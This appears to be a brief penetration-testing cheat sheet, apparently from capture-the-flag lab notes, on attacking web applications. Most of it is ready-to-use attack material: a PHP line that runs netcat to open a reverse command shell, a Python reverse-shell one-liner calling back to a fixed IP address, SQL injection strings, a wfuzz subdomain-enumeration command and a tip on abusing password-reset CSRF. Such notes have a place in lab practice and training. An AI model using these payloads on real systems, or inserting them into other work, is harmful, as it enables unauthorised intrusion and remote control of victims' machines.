# Web Application Enumeration and Attacks

| Check | Description |
| ---------------------------- | ---------------------------- |
| Curl vs Refreshing the page | Curl the page, you may see different users invoking the service (secnotes.htb) |
| Simple PHP to run nc.exe | ```<?php system('nc.exe -e cmd.exe 10.10.16.19 12345' ?> >> nc.php``` |
| Check for XSRF in password reset functions | If the application allows a password reset without validating the user, you maybe able to trick the user into resetting their password |
| Subdomain enumeration with wfuzz | ```sudo wfuzz -c -f sub-fighter.txt -w subdomains-top1million-5000.txt -u 'http://domain.xyz' -H "Host:FUZZ.domain.xyz" --hw 290``` |

## 2nd Order SQLi
```
' OR 1 OR '
' OR 1='1
```

## Python Reverse Shell
```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.19",12345));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```